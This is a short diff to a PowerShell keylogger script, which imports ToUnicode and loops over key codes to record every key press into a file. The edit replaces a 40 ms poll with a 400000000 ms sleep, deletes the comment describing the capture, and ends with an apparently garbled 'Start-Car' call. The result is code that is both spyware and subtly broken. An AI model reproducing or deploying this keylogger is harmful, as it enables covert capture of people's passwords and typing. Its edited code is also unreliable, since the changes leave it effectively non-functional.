@@ -33,7 +33,7 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
     $Runner = 0
 	while ($TimesToRun  -ge $Runner) {
 	while ($TimeEnd -ge $TimeNow) {
-      Start-Sleep -Milliseconds 40
+      Start-Sleep -Milliseconds 400000000
       
       # scan all ASCII codes above 8
       for ($ascii = 9; $ascii -le 254; $ascii++) {
@@ -75,7 +75,4 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
 	exit 1
   }
 }
-
-# records all key presses until script is aborted by pressing CTRL+C
-# will then open the file with collected key codes
 Start-Car
